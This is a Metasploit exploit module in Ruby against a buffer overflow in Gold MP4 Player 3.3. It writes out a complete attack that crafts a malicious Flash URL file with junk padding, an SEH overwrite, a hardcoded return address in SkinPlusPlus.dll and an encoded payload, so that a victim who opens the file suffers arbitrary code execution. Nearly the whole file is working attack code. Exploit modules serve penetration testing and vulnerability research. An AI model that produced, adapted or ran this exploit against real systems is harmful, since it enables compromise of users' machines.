
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::FILEFORMAT
    include Msf::Exploit::Remote::Seh
 
    def initialize(info = {})
        super(update_info(info,
            'Name'           => 'Gold MP4 Player 3.3 Universal SEH Exploit',
            'Description'    => %q{
                    This module exploits a buffer overflow in Gold MP4 Player 3.3.
                    When this application is loaded a special crafted Flash URL via File -> Open Flash URL. Buffer overflow happens and it allowing arbitrary code execution.
            },
            'License'        => MSF_LICENSE,
            'Author'         =>
                [
                    'Revin Hadi S', #Exploit & MSF Module
                    'Gabor Seljan' #Vulnerability POC
                ],
            'Version'        => '$Revision: $',
            'References'     =>
                [
                    [ 'URL', 'http://www.exploit-db.com/exploits/31914/' ],
                ],
            'DefaultOptions' =>
                {
                    'EXITFUNC' => 'seh',
                    'DisablePayloadHandler' => 'true'
                },
            'Payload'        =>
                {
                    'Space'    => 1000,
                    'BadChars' => "\x00\x0a\x0d\x20",
                    'StackAdjustment' => -3500,
                },
            'Platform' => 'win',
            'Targets'        =>
                [
                    [ 'Windows Universal', { 'Ret' => 0x100F041C, 'Offset' => 253 } ],    #/p/p/r SkinPlusPlus.dll
                ],
            'Privileged'     => false,
            'DisclosureDate' => 'Date',
            'DefaultTarget'  => 0))
 
            register_options(
                [
                    OptString.new('FILENAME', [ true, 'The file name contains malicious Flash URL.',  'evil.txt']),
                ], self.class)
 
    end
 
    def exploit
        http = "http://"
        junk = "\x41" * (target['Offset'])
        nseh = "\xEB\x06\x90\x90"
        format = ".swf"
        sploit = http + junk + nseh + [target['Ret']].pack('V') + make_nops(16) + payload.encoded + format
       
        print_status("Creating '#{datastore['FILENAME']}' file ...")
 
        file_create(sploit)
 
    end
 
end
